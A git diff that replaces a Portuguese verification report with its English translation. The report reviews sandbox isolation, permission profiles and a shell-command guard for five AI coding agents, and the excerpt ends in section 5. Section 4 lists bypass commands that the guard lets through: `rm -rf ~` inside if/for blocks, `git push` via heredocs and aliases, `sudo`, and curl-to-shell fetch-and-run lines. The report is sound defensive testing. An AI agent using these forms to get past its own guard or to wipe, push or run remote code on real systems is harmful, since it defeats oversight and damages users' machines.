@@ -1,64 +1,66 @@
-# Verificação independente (fase estática): preparação da E6 (`agents/`) e da E8 (`eval/`)
+> Translated from the Portuguese original (commit 30666ad).
 
-- **Data:** 29/10/2026, das 11:55 às 12:15.
-- **Objeto:** `agents/` como está em `2de5b31` (com `3d0efb1` e `d11901a`) e `eval/` como está em `1f8e59f`.
-- **Arquivos alterados durante a verificação:**
-  - No início, o `git diff --stat` mostrava `eval/README.md | 28 +++-` e `eval/run.sh | 43 ++++--` (61 inserções, 10 remoções). O agente da E7 estava editando os dois.
-  - Durante a verificação, essas mudanças entraram no commit `70a6d04` (o gancho `EVAL_WRAPPER`).
-  - Avaliei a lógica de `1f8e59f`. Não tratei o gancho `EVAL_WRAPPER` como defeito: ele fica para o verificador da E7.
-- **Método:** só verificação estática, porque a E4 estava rodando.
-  - Fiz:
-    - leitura completa dos arquivos;
-    - `bash -n` e `py_compile`;
+# Independent verification (static phase): E6 preparation (`agents/`) and E8 preparation (`eval/`)
+
+- **Date:** Oct 29, 2026, from 11:55 to 12:15.
+- **Subject:** `agents/` as of `2de5b31` (with `3d0efb1` and `d11901a`) and `eval/` as of `1f8e59f`.
+- **Files changed during the verification:**
+  - At the start, `git diff --stat` showed `eval/README.md | 28 +++-` and `eval/run.sh | 43 ++++--` (61 insertions, 10 deletions). The E7 agent was editing both.
+  - During the verification, those changes went into commit `70a6d04` (the `EVAL_WRAPPER` hook).
+  - I evaluated the logic of `1f8e59f`. I did not treat the `EVAL_WRAPPER` hook as a defect: it is left for the E7 verifier.
+- **Method:** static verification only, because E4 was running.
+  - What I did:
+    - complete reading of the files;
+    - `bash -n` and `py_compile`;
     - `agents/lib/test-guard.sh`;
-    - 65 comandos montados para contornar a guarda, passados direto ao `guard.py`;
-    - dry-run dos 5 `run.sh`, com uma HOME descartável e com a HOME real;
-    - `npm view` com o cache do npm numa pasta descartável;
-    - `stat` (só a data de modificação) das configurações reais.
-  - Não rodei LLM, docker, jest, pytest, `validate.sh`, `run.sh` nem `matrix.sh` do eval.
-- **Efeito colateral meu, já desfeito:**
-  - O `python3 -I -m py_compile` criou 7 pastas `__pycache__` no repositório, porque o `-I` ignora `PYTHONPYCACHEPREFIX`.
-  - Todas tinham data de criação entre 11:57:18 e 11:57:19, então nenhuma existia antes. Apaguei as 7 logo depois.
-  - Fora este relatório, não alterei mais nada no repositório.
+    - 65 commands built to bypass the guard, passed directly to `guard.py`;
+    - dry-run of the 5 `run.sh`, with a disposable HOME and with the real HOME;
+    - `npm view` with the npm cache in a disposable folder;
+    - `stat` (modification date only) of the real configurations.
+  - I did not run an LLM, docker, jest, pytest, the eval's `validate.sh`, `run.sh` or `matrix.sh`.
+- **My side effect, already undone:**
+  - `python3 -I -m py_compile` created 7 `__pycache__` folders in the repository, because `-I` ignores `PYTHONPYCACHEPREFIX`.
+  - All had a creation date between 11:57:18 and 11:57:19, so none existed before. I deleted all 7 right after.
+  - Apart from this report, I changed nothing else in the repository.
 
-## Resumo
+## Summary
 
-| Área | Veredito | Em uma linha |
+| Area | Verdict | In one line |
 |---|---|---|
-| Contrato `run.sh` (5 agentes) | **PASS** | Os cinco usam o mesmo `parse_run_args`, `env.sh` e `run_agent`. `LLM_BASE_URL` e `LLM_MODEL` são respeitados, inclusive com `/v1/` no fim. Saída = código do agente; erro de argumento = 2. |
-| Isolamento das configurações | **PARCIAL** | As configs geradas e o dry-run ficam isolados, conferido na HOME real. Mas o `install.sh` executa `<agente> --version` com a HOME real (**bloqueante**). No host, os agentes herdam variáveis da sessão do Claude Code orquestrador. |
-| Versões e integridade npm | **PASS** | 5 de 5 hashes `dist.integrity` iguais ao registro. Há ressalvas menores sobre dependências transitivas e o `latest` do Qwen Code. |
-| Perfis de permissão e guarda | **PARCIAL** | Os perfis são coerentes entre si. A guarda deixa passar sintaxe comum de shell (`if …; then rm -rf ~; fi`, `for …; do git push; done`, heredoc para `bash`). O README promete mais do que ela faz ("`git push` em qualquer forma"). |
-| Claude Code `bypassPermissions` | **PARCIAL** | Só é alcançado pelo `run.sh` (ou por flag passada à mão ao lançador), sempre com `CLAUDE_CONFIG_DIR` isolado. Nada impede rodar no host. O README do `claude-local` não diz que é só dentro do container. |
-| Checagens leves | **PASS** | `bash -n`: 46 de 46. `py_compile`: 13 de 13. `test-guard.sh`: todos os casos passaram. Dry-run: 5 de 5 sem executar nada e sem tocar nas configs reais. |
-| Tarefas e prompts (T1–T7, S1–S3) | **PASS** | Os prompts são realistas e não citam os testes ocultos. Testes ocultos e soluções só entram no workdir durante a verificação. |
-| Verificações ocultas | **PARCIAL** | São boas no geral, com três problemas. O T6 exige uma semântica que a especificação não define. O T5 aprova a causa raiz por palavras-chave, sem revisão obrigatória. A proteção da configuração de testes tem lacunas (`conftest.py` fora da lista, `pytest.toml`, `.venv`/`node_modules`). |
-| Mutantes (T4, S3) | **PARCIAL** | Os 18 mutantes são significativos. Mas qualquer arquivo de teste já existente que o agente altere entra na conta e infla a nota do T4. |
-| Runner, esquema e agregação | **PASS** | A lógica está correta. Há ressalvas menores: o critério da Meta 1 ignora intervenções e ações destrutivas, e erro de infraestrutura nas verificações vira `fail`. |
+| `run.sh` contract (5 agents) | **PASS** | All five use the same `parse_run_args`, `env.sh` and `run_agent`. `LLM_BASE_URL` and `LLM_MODEL` are respected, even with a trailing `/v1/`. Exit = the agent's code; argument error = 2. |
+| Configuration isolation | **PARTIAL** | The generated configs and the dry-run are isolated, checked on the real HOME. But `install.sh` runs `<agent> --version` with the real HOME (**blocking**). On the host, the agents inherit variables from the orchestrating Claude Code session. |
+| npm versions and integrity | **PASS** | 5 of 5 `dist.integrity` hashes equal the registry. There are minor caveats about transitive dependencies and Qwen Code's `latest`. |
+| Permission profiles and guard | **PARTIAL** | The profiles are consistent with each other. The guard lets common shell syntax through (`if …; then rm -rf ~; fi`, `for …; do git push; done`, heredoc to `bash`). The README promises more than it does ("`git push` in any form"). |
+| Claude Code `bypassPermissions` | **PARTIAL** | Only reached by `run.sh` (or by a flag passed by hand to the launcher), always with an isolated `CLAUDE_CONFIG_DIR`. Nothing prevents running it on the host. The `claude-local` README does not say it is container-only. |
+| Light checks | **PASS** | `bash -n`: 46 of 46. `py_compile`: 13 of 13. `test-guard.sh`: all cases passed. Dry-run: 5 of 5 without executing anything and without touching the real configs. |
+| Tasks and prompts (T1–T7, S1–S3) | **PASS** | The prompts are realistic and do not cite the hidden tests. Hidden tests and solutions only enter the workdir during verification. |
+| Hidden checks | **PARTIAL** | Good overall, with three problems. T6 requires semantics the specification does not define. T5 approves the root cause by keywords, with no mandatory review. The protection of the test configuration has gaps (`conftest.py` outside the list, `pytest.toml`, `.venv`/`node_modules`). |
+| Mutants (T4, S3) | **PARTIAL** | The 18 mutants are meaningful. But any already-existing test file that the agent changes enters the count and inflates T4's score. |
+| Runner, schema and aggregation | **PASS** | The logic is correct. There are minor caveats: the Goal 1 criterion ignores interventions and destructive actions, and an infrastructure error in the checks becomes `fail`. |
 
-**1 bloqueante, 7 importantes e 9 menores** (lista no fim). Para o eval nenhum problema é bloqueante. O bloqueante é do `agents/install.sh` e só vale para a instalação no host.
+**1 blocking, 7 important and 9 minor** (list at the end). For the eval, no problem is blocking. The blocking one is in `agents/install.sh` and only applies to installation on the host.
 
 ---
 
-## 1. `agents/`: contrato do `run.sh`: PASS
+## 1. `agents/`: `run.sh` contract: PASS
 
-- Todos os `run.sh` fazem a mesma coisa: `set -euo pipefail`, depois `source lib/common.sh`, `parse_run_args "$@"`, `source env.sh` e `run_agent <agente> -- …`.
-- O `parse_run_args` faz o seguinte:
-  - valida os três argumentos (aceita também `--x=valor`);
-  - resolve os caminhos com `pwd -P`;
-  - recusa prompt vazio ou com 120 KB ou mais;
-  - acrescenta `\n` ao prompt que começa com `-`;
-  - usa `AGENT_PROFILE=autonomous` por padrão;
-  - cria `AGENT_HOME=<log-dir>/home`.
-- O `run_agent` faz o seguinte:
-  - grava `command.txt` com `@PROMPT@` no lugar do prompt;
-  - no `AGENT_DRY_RUN=1`, imprime e retorna 0 antes de qualquer execução;
-  - nos outros casos, roda com `cd workdir`, stdin `/dev/null` e o `timeout` opcional;
-  - grava `run-meta.json` e `agent-metrics.json`, o segundo sem mudar o código de saída;
-  - devolve o código do agente.
-- Códigos de saída: o do agente; 2 em erro de argumento (`die`); 124 ou 137 no timeout.
+- All `run.sh` do the same thing: `set -euo pipefail`, then `source lib/common.sh`, `parse_run_args "$@"`, `source env.sh` and `run_agent <agent> -- …`.
+- `parse_run_args` does the following:
+  - validates the three arguments (also accepts `--x=value`);
+  - resolves paths with `pwd -P`;
+  - refuses an empty prompt or one of 120 KB or more;
+  - appends `\n` to a prompt that starts with `-`;
+  - uses `AGENT_PROFILE=autonomous` by default;
+  - creates `AGENT_HOME=<log-dir>/home`.
+- `run_agent` does the following:
+  - writes `command.txt` with `@PROMPT@` in place of the prompt;
+  - with `AGENT_DRY_RUN=1`, prints and returns 0 before any execution;
+  - otherwise, runs with `cd workdir`, stdin `/dev/null` and the optional `timeout`;
+  - writes `run-meta.json` and `agent-metrics.json`, the second without changing the exit code;
+  - returns the agent's code.
+- Exit codes: the agent's; 2 on an argument error (`die`); 124 or 137 on timeout.
 
-Dry-run com HOME descartável, `LLM_BASE_URL=http://127.0.0.1:9999/v1/` e `LLM_MODEL=modelo-x` (trecho):
+Dry-run with a disposable HOME, `LLM_BASE_URL=http://127.0.0.1:9999/v1/` and `LLM_MODEL=modelo-x` (excerpt):
 
 ```
 $ env -i HOME=$S/dry/home PATH=/usr/local/bin:/usr/bin:/bin AGENT_DRY_RUN=1 LLM_BASE_URL=http://127.0.0.1:9999/v1/ \
@@ -73,35 +75,35 @@ claude-local … claude -p --output-format stream-json --verbose --model modelo-
                --setting-sources user --exclude-dynamic-system-prompt-sections --permission-mode bypassPermissions @PROMPT@  rc=0
 ```
 
-- URL nos 5 arquivos gerados: `http://127.0.0.1:9999/v1`, com o `/v1/` do fim removido e reposto uma vez só.
-- O modelo `modelo-x` aparece 9 vezes.
-- Todos os JSON são válidos (`jq`) e nenhuma chave `//` sobrou.
-- O TOML do Codex é válido (`tomllib`): `model_auto_compact_token_limit=98304`, `hooks.PreToolUse[0].matcher='Bash'`.
-- O `local.rules` tem as 9 `prefix_rule`.
-- O hook aponta para `python3 -I "<repo>/agents/lib/guard.py"` nos três agentes que usam hook. No container, `agents/` é montado no mesmo caminho (`sandbox/run-in-box.sh:121`).
+- URL in the 5 generated files: `http://127.0.0.1:9999/v1`, with the trailing `/v1/` removed and re-added exactly once.
+- The model `modelo-x` appears 9 times.
+- All JSON files are valid (`jq`) and no `//` key was left over.
+- Codex's TOML is valid (`tomllib`): `model_auto_compact_token_limit=98304`, `hooks.PreToolUse[0].matcher='Bash'`.
+- `local.rules` has the 9 `prefix_rule` entries.
+- The hook points to `python3 -I "<repo>/agents/lib/guard.py"` in the three agents that use a hook. In the container, `agents/` is mounted at the same path (`sandbox/run-in-box.sh:121`).
 
-## 2. `agents/`: isolamento: PARCIAL
+## 2. `agents/`: isolation: PARTIAL
 
-### O que está certo
+### What is right
 
-| Agente | Variável | Onde fica | Conferido |
+| Agent | Variable | Where it lives | Checked |
 |---|---|---|---|
-| Qwen Code | `QWEN_HOME` | `<log-dir>/home/qwen` | `env.sh`; lê também `~/.env` (documentado; não existe aqui) |
-| Codex | `CODEX_HOME` | `<log-dir>/home/codex` | `env.sh`; apaga `OPENAI_API_KEY`, `CODEX_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_ORG_ID`, `OPENAI_PROJECT_ID` |
+| Qwen Code | `QWEN_HOME` | `<log-dir>/home/qwen` | `env.sh`; also reads `~/.env` (documented; it does not exist here) |
+| Codex | `CODEX_HOME` | `<log-dir>/home/codex` | `env.sh`; clears `OPENAI_API_KEY`, `CODEX_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_ORG_ID`, `OPENAI_PROJECT_ID` |
 | Pi | `PI_CODING_AGENT_DIR` | `<log-dir>/home/pi` | `env.sh` |
-| OpenCode | `XDG_CONFIG/DATA/CACHE/STATE_HOME` | `<log-dir>/home/opencode/*` | `env.sh`; `OPENCODE_DISABLE_CLAUDE_CODE=1` e `OPENCODE_DISABLE_EXTERNAL_SKILLS=1` (não lê `~/.claude`/`~/.agents`) |
-| Claude Code | `CLAUDE_CONFIG_DIR` | `<log-dir>/home/claude` | `env.sh`; apaga `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, Bedrock/Vertex/Foundry |
+| OpenCode | `XDG_CONFIG/DATA/CACHE/STATE_HOME` | `<log-dir>/home/opencode/*` | `env.sh`; `OPENCODE_DISABLE_CLAUDE_CODE=1` and `OPENCODE_DISABLE_EXTERNAL_SKILLS=1` (does not read `~/.claude`/`~/.agents`) |
+| Claude Code | `CLAUDE_CONFIG_DIR` | `<log-dir>/home/claude` | `env.sh`; clears `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, Bedrock/Vertex/Foundry |
 
-- Nenhum script nem config cita `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode` ou `~/.pi` como caminho de leitura ou escrita. Esses nomes só aparecem em comentários.
-- O `grep` nos arquivos gerados não achou caminhos da HOME real nem as chaves falsas que injetei (`sk-real…`, `sk-ant…`):
+- No script or config cites `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode` or `~/.pi` as a read or write path. Those names only appear in comments.
+- `grep` over the generated files found no real HOME paths nor the fake keys I injected (`sk-real…`, `sk-ant…`):
 
 ```
 $ grep -rnE '~/(\.claude|\.codex|\.qwen|\.gemini|\.pi|\.config|\.agents)|sk-real|sk-ant' log-*   # caminhos anonimizados para publicação; no original era o caminho absoluto da HOME
 (nenhuma)
 ```
 
-- A HOME descartável continuou vazia depois dos 5 dry-runs (`find $S/dry/home` mostrou só a raiz).
-- Repeti os dry-runs com a **HOME real** e comparei a data de modificação dos caminhos que não mudam sozinhos:
+- The disposable HOME remained empty after the 5 dry-runs (`find $S/dry/home` showed only the root).
+- I repeated the dry-runs with the **real HOME** and compared the modification date of the paths that do not change by themselves:
 
 ```
 antes == depois:
@@ -109,25 +111,25 @@ antes == depois:
 ~/.qwen, ~/.config/opencode, ~/.local/share/opencode, ~/.pi, ~/.local/opt/agents: ausentes antes e depois
 ```
 
-`~/.claude` e `~/.claude.json` mudam o tempo todo por causa da própria sessão do orquestrador. Por isso a data deles não serve de prova, nem aqui nem na E6: a prova tem que vir do container ou de uma HOME descartável.
+`~/.claude` and `~/.claude.json` change all the time because of the orchestrator's own session. So their date is no proof, neither here nor in E6: the proof has to come from the container or from a disposable HOME.
 
-### O que falha
+### What fails
 
-- **B1: `agents/install.sh` executa cada agente com a HOME real.**
-  - A última linha de `install_one` é `"$dest/bin/$exe" --version || true`, sem `HOME` temporária e sem as variáveis de isolamento.
-  - A própria E7 registrou o efeito em `sandbox/install-agents.sh`: *"O --version de alguns agentes cria arquivos na HOME; nada disso fica na imagem"*. Por isso o script da E7 troca a `HOME` por uma pasta temporária.
-  - No host, o mesmo comando pode criar `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi` ou mexer em `~/.codex`/`~/.claude.json`.
-  - Não executei para confirmar: os binários não estão instalados e a instalação não cabia nesta fase. Mesmo assim, é exatamente o tipo de vazamento que o README diz não existir, e a correção é de uma linha.
-- **I4: variáveis da sessão do orquestrador passam para o agente no host.**
-  - O ambiente desta sessão tem `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_ENABLE_TELEMETRY`, `CLAUDE_EFFORT`, `CLAUDE_CODE_ENTRYPOINT` e `CLAUDE_CODE_EXECPATH`. Só listei os nomes, não os valores.
-  - `claude-local/env.sh` não apaga nenhuma delas. `qwen-code/env.sh` e `pi/env.sh` também não apagam `OPENAI_*`.
-  - Dentro do container isso não acontece, porque o `run-in-box.sh` só repassa variáveis de uma lista (`sandbox/run-in-box.sh:167-176`).
-  - No host acontece. Exemplos: `measure-preamble.sh` chamado pelo orquestrador, ou um lançador aberto num terminal dentro de uma sessão do Claude Code. O Claude local herdaria o socket e o token de mensagens da sessão pai.
+- **B1: `agents/install.sh` runs each agent with the real HOME.**
+  - The last line of `install_one` is `"$dest/bin/$exe" --version || true`, without a temporary `HOME` and without the isolation variables.
+  - E7 itself recorded the effect in `sandbox/install-agents.sh`: *"O --version de alguns agentes cria arquivos na HOME; nada disso fica na imagem"* (in English: the `--version` of some agents creates files in HOME; none of that stays in the image). This is why the E7 script swaps `HOME` for a temporary folder.
+  - On the host, the same command may create `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi` or touch `~/.codex`/`~/.claude.json`.
+  - I did not run it to confirm: the binaries are not installed and the installation did not fit in this phase. Even so, it is exactly the type of leak the README says does not exist, and the fix is one line.
+- **I4: orchestrator session variables pass to the agent on the host.**
+  - This session's environment has `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_ENABLE_TELEMETRY`, `CLAUDE_EFFORT`, `CLAUDE_CODE_ENTRYPOINT` and `CLAUDE_CODE_EXECPATH`. I only listed the names, not the values.
+  - `claude-local/env.sh` clears none of them. `qwen-code/env.sh` and `pi/env.sh` do not clear `OPENAI_*` either.
+  - Inside the container this does not happen, because `run-in-box.sh` only forwards variables from a list (`sandbox/run-in-box.sh:167-176`).
+  - On the host it does. Examples: `measure-preamble.sh` called by the orchestrator, or a launcher opened in a terminal inside a Claude Code session. Local Claude would inherit the parent session's messaging socket and token.
 
-## 3. `agents/`: versões e integridade: PASS
+## 3. `agents/`: versions and integrity: PASS
 
 ```
-$ npm view --cache <descartável> <pkg>@<ver> dist.integrity      (comparado com agents/versions.env)
+$ npm view --cache <descartável> <pkg>@<ver> dist.integrity      (compared with agents/versions.env)
 OK @qwen-code/qwen-code@0.26.3            publicado 2026-10-28  (dist-tags.latest agora = 0.26.4)
 OK @earendil-works/pi-coding-agent@1.4.0  publicado 2026-10-21  (latest = 1.4.0)
 OK opencode-ai@1.19.5                     publicado 2026-10-28  (latest = 1.19.5)
@@ -135,194 +137,194 @@ OK @anthropic-ai/claude-code@2.1.308      publicado 2026-10-22  (stable = 2.1.30
 OK @openai/codex@0.165.0                  publicado 2026-10-27  (latest = 0.165.0)
 ```
 
-- Os binários nativos vêm em dependências opcionais com versão exata e sem hash fixado no `versions.env`: `@openai/codex@0.165.0-linux-x64`, `@anthropic-ai/claude-code-linux-x64@2.1.308` e `opencode-linux-x64@1.19.5`. O npm não aceita publicar de novo a mesma versão, então o risco é pequeno.
-- O Pi tem 22 dependências com versão exata, mas as dependências delas podem variar, porque a instalação não usa lockfile (M2).
-- `postinstall`: só `opencode-ai` (`node ./postinstall.mjs`) e `claude-code` (`node install.cjs`), como o README diz.
-- O `install.sh` compara o `dist.integrity` publicado no registro, sem calcular o hash do arquivo baixado. O `sandbox/install-agents.sh` calcula o SHA-512 do tarball, o que é mais forte (M2).
+- The native binaries come in optional dependencies with an exact version and no hash pinned in `versions.env`: `@openai/codex@0.165.0-linux-x64`, `@anthropic-ai/claude-code-linux-x64@2.1.308` and `opencode-linux-x64@1.19.5`. npm does not allow publishing the same version again, so the risk is small.
+- Pi has 22 dependencies with exact versions, but their own dependencies may vary, because the installation does not use a lockfile (M2).
+- `postinstall`: only `opencode-ai` (`node ./postinstall.mjs`) and `claude-code` (`node install.cjs`), as the README says.
+- `install.sh` compares the `dist.integrity` published in the registry, without computing the hash of the downloaded file. `sandbox/install-agents.sh` computes the SHA-512 of the tarball, which is stronger (M2).
 
-## 4. `agents/`: perfis de permissão e guarda: PARCIAL
+## 4. `agents/`: permission profiles and guard: PARTIAL
 
-### Perfis
+### Profiles
 
-| | interactive | autonomous | Bloqueios nativos (autonomous) |
+| | interactive | autonomous | Native blocks (autonomous) |
 |---|---|---|---|
-| Qwen Code | `default`: shell e edição perguntam | `--approval-mode yolo` | `deny`: git push, sudo/su/doas/pkexec, npm/pnpm/yarn/bun/pip/uv/apt/brew |
-| Codex | `on-request` + `workspace-write`, sem rede | `never` + `danger-full-access` | `forbidden`: git push, sudo…, instaladores |
-| Pi | extensão: shell pergunta (menos leitura simples), escrita fora pergunta | extensão: escrita fora do projeto bloqueada | só a extensão (o Pi não tem permissões próprias) |
-| OpenCode | `bash "*": ask`, `external_directory: ask` | `--auto`; `bash "*": allow`; `external_directory` só `/tmp/*`; `doom_loop: deny` | `deny`: git push, sudo…, `sh`/`bash` sem argumentos, instaladores |
-| Claude Code | `acceptEdits`; Bash pergunta | `bypassPermissions` | `deny`: WebSearch/WebFetch, git push, sudo…, `sh`/`bash`, `rm -rf /`/`~`, instaladores |
+| Qwen Code | `default`: shell and edit ask | `--approval-mode yolo` | `deny`: git push, sudo/su/doas/pkexec, npm/pnpm/yarn/bun/pip/uv/apt/brew |
+| Codex | `on-request` + `workspace-write`, no network | `never` + `danger-full-access` | `forbidden`: git push, sudo…, installers |
+| Pi | extension: shell asks (except simple reads), writes outside ask | extension: writes outside the project blocked | only the extension (Pi has no permissions of its own) |
+| OpenCode | `bash "*": ask`, `external_directory: ask` | `--auto`; `bash "*": allow`; `external_directory` only `/tmp/*`; `doom_loop: deny` | `deny`: git push, sudo…, `sh`/`bash` without arguments, installers |
+| Claude Code | `acceptEdits`; Bash asks | `bypassPermissions` | `deny`: WebSearch/WebFetch, git push, sudo…, `sh`/`bash`, `rm -rf /`/`~`, installers |
 
-Os perfis são coerentes com a seção 7 do plano: push, sudo e instalação pela rede ficam bloqueados nos dois, e o shell é livre só no autonomous. Pontos de atenção:
+The profiles are consistent with section 7 of the plan: push, sudo and installation over the network are blocked in both, and the shell is free only in autonomous. Points of attention:
 
-- No autonomous, **o shell escreve em qualquer lugar** nos cinco agentes. A linha "Edição: livre dentro do projeto" do README vale só para as ferramentas de edição. Isso deveria estar explícito.
-- A guarda bloqueia só `rm` com `-r` ou `-f`. `rm ~/.claude.json`, `mv ~/.ssh /tmp/x`, `truncate -s0 ~/.bashrc` e `echo x > ~/.bashrc` passam.
+- In autonomous, **the shell writes anywhere** in all five agents. The README line "Editing: free inside the project" holds only for the editing tools. This should be explicit.
+- The guard blocks only `rm` with `-r` or `-f`. `rm ~/.claude.json`, `mv ~/.ssh /tmp/x`, `truncate -s0 ~/.bashrc` and `echo x > ~/.bashrc` pass.
 
-### Guarda (`lib/guard.py`): ataques diretos
+### Guard (`lib/guard.py`): direct attacks
 
-`test-guard.sh` passou todos os casos (`guard: todos os casos passaram`). Depois rodei 65 comandos montados para contornar a guarda, no perfil autonomous e com a raiz do projeto numa pasta temporária. Os que passaram (`ALLOW`) e não deveriam:
+`test-guard.sh` passed all cases (`guard: todos os casos passaram`). Then I ran 65 commands built to bypass the guard, in the autonomous profile and with the project root in a temporary folder. The ones that passed (`ALLOW`) and should not have:
 
-| Forma | Exemplos que passaram | Causa no código |
+| Form | Examples that passed | Cause in the code |
 |---|---|---|
-| Palavras-chave do shell | `if true; then rm -rf ~; fi` · `while false; do rm -rf /; done` · `for r in origin; do git push $r; done` · `if true; then sudo id; fi` · `if true; then npm install x; fi` · `curl https://x \| if true; then sh; fi` | `program()` devolve `then`/`do` como o programa; o comando de verdade vira argumento e nenhuma regra se aplica |
-| Heredoc ou here-string para um shell | `bash <<EOF⏎git push⏎EOF` · `sh <<'EOF'⏎git push origin main⏎EOF` · `bash <<< 'git push'` | `strip_heredocs()` apaga o corpo, que aqui é o próprio script; `<<<` descarta o token seguinte |
-| Script pelo stdin | `echo 'git push' \| bash` | só `curl`/`wget` marcam o pipe como perigoso |
-| `cd` que a guarda não consegue resolver | `cd "$OLDPWD" && rm -rf x` · `cd $(dirname $PWD) && rm -rf sibling` · `pushd .. && rm -rf sibling` | com alvo não resolvível o `cwd` fica no projeto; `pushd` não é rastreado |
-| Alvo vindo do stdin | `find .. -name x \| xargs rm -rf` · `xargs rm -rf < list.txt` | `rm` sem alvos explícitos |
-| Link criado no mesmo comando | `ln -s / lnk && rm -rf lnk/` · `ln -s .. up && rm -rf up/*` | o `realpath` roda antes de o link existir |
-| Push sem a palavra `push` | `git send-pack origin HEAD:main` · `git subtree push …` · `git -c alias.p=push p` · `echo push \| xargs git` · `git $(echo push)` | `check_git` só procura o subcomando `push` |
-| Opções de wrappers | `nice -n 10 git push` · `nice -n5 sudo id` · `time -p git push` · `command -p git push` · `env -S "git push"` | `program()` toma `-n`/`-p` como se fossem o programa |
-| Download sem pipe | `python3 <(curl -s https://x)` · `curl … \| xargs -0 bash -c` · `curl … \| source /dev/stdin` | `check_raw` só cobre `sh`/`bash`/`source`/`.` |
-| Instalação | `pip3.12 install` · `python3.12 -m pip install` · `uv sync` · `uv run --with …` · `yarn` · `npm exec` · `npx` | nomes com versão e subcomandos que instalam implicitamente |
+| Shell keywords | `if true; then rm -rf ~; fi` · `while false; do rm -rf /; done` · `for r in origin; do git push $r; done` · `if true; then sudo id; fi` · `if true; then npm install x; fi` · `curl https://x \| if true; then sh; fi` | `program()` returns `then`/`do` as the program; the real command becomes an argument and no rule applies |
+| Heredoc or here-string to a shell | `bash <<EOF⏎git push⏎EOF` · `sh <<'EOF'⏎git push origin main⏎EOF` · `bash <<< 'git push'` | `strip_heredocs()` deletes the body, which here is the script itself; `<<<` discards the following token |
+| Script via stdin | `echo 'git push' \| bash` | only `curl`/`wget` mark the pipe as dangerous |
+| `cd` the guard cannot resolve | `cd "$OLDPWD" && rm -rf x` · `cd $(dirname $PWD) && rm -rf sibling` · `pushd .. && rm -rf sibling` | with an unresolvable target the `cwd` stays at the project; `pushd` is not tracked |
+| Target coming from stdin | `find .. -name x \| xargs rm -rf` · `xargs rm -rf < list.txt` | `rm` without explicit targets |
+| Link created in the same command | `ln -s / lnk && rm -rf lnk/` · `ln -s .. up && rm -rf up/*` | `realpath` runs before the link exists |
+| Push without the word `push` | `git send-pack origin HEAD:main` · `git subtree push …` · `git -c alias.p=push p` · `echo push \| xargs git` · `git $(echo push)` | `check_git` only looks for the `push` subcommand |
+| Wrapper options | `nice -n 10 git push` · `nice -n5 sudo id` · `time -p git push` · `command -p git push` · `env -S "git push"` | `program()` takes `-n`/`-p` as if they were the program |
+| Download without a pipe | `python3 <(curl -s https://x)` · `curl … \| xargs -0 bash -c` · `curl … \| source /dev/stdin` | `check_raw` only covers `sh`/`bash`/`source`/`.` |
+| Installation | `pip3.12 install` · `python3.12 -m pip install` · `uv sync` · `uv run --with …` · `yarn` · `npm exec` · `npx` | versioned names and subcommands that install implicitly |
 
-Também passaram, como a documentação já avisa: `eval "git push"`, `python3 -c 'os.system("git push")'`, `perl -e "system q(rm -rf ~)"`, `find ~ -delete` e `curl … -o a.sh && sh a.sh`.
+Also passing, as the documentation already warns: `eval "git push"`, `python3 -c 'os.system("git push")'`, `perl -e "system q(rm -rf ~)"`, `find ~ -delete` and `curl … -o a.sh && sh a.sh`.
 
-Foram bloqueados corretamente: `git pu\sh`, `git 'push'`, `/usr/bin/git push`, `git --no-pager push`, `bash -xc "git push"`, `bash --login -c …`, `sudo id`, `rm -rf -- ..`, `rm -r ../*`, `curl … | node`, `curl … | env bash`, `wget -O- … | sh -` e `pip install -r …`.
+Correctly blocked: `git pu\sh`, `git 'push'`, `/usr/bin/git push`, `git --no-pager push`, `bash -xc "git push"`, `bash --login -c …`, `sudo id`, `rm -rf -- ..`, `rm -r ../*`, `curl … | node`, `curl … | env bash`, `wget -O- … | sh -` and `pip install -r …`.
 
-**A documentação é honesta?**
+**Is the documentation honest?**
 
-- Em parte, sim. O README, a docstring do `guard.py` e o `agents/README.md` dizem que a guarda é a segunda camada e que a barreira real é o container. Também citam `eval`, base64, scripts gerados, `find -delete`/`-exec rm` e `npx`.
-- Mas o mesmo README promete "`git push` em qualquer forma" e "`rm -r/-f` fora do projeto". Os casos acima não são ofuscação: `for …; do …; done` e `if …; then …; fi` são o jeito normal de um modelo escrever shell.
-- A lista de limites precisa ser corrigida (I2). Para o Pi, a guarda é a única camada além do container.
+- In part, yes. The README, the `guard.py` docstring and `agents/README.md` say the guard is the second layer and that the real barrier is the container. They also cite `eval`, base64, generated scripts, `find -delete`/`-exec rm` and `npx`.
+- But the same README promises "`git push` in any form" and "`rm -r/-f` outside the project". The cases above are not obfuscation: `for …; do …; done` and `if …; then …; fi` are the normal way a model writes shell.
+- The list of limits needs to be corrected (I2). For Pi, the guard is the only layer besides the container.
 
-## 5. Claude Code `bypassPermissions`: PARCIAL
+## 5. Claude Code `bypassPermissions`: PARTIAL
 
-- **Onde aparece.** `--permission-mode bypassPermissions` só existe em `claude-local/run.sh`, quando `AGENT_PROFILE=autonomous`, depois de `source env.sh`, que exporta `CLAUDE_CONFIG_DIR="$AGENT_HOME/claude"`.
-  - Os `settings.*.json` não definem `defaultMode: bypassPermissions`. O interativo usa `acceptEdits`.
-  - O lançador `claude-local` repassa `"$@"`. Quem digitar `--dangerously-skip-permissions` entra em bypass, mas ainda com o diretório isolado.
-  - Não há caminho para o bypass que use `~/.claude`. **PASS** nesse ponto.
-- **"Precisa rodar no container da E7".**
-  - Nem `agents/README.md` nem `agents/claude-local/README.md` dizem isso. O que dizem é que "o container é a barreira real".
